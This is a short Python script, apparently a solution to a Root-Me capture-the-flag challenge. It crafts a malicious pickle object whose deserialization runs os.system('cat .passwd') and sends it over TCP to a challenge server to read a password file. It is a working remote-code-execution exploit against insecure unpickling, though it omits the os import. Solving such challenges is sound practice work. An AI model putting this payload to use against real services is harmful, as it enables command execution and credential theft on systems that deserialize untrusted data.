import pickle
import socket

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat .passwd',))

payload = pickle.dumps(Exploit())

# Send payload over TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge02.root-me.org', 60005))
s.send(payload)
data = s.recv(1024)
print(data.decode())
s.close()
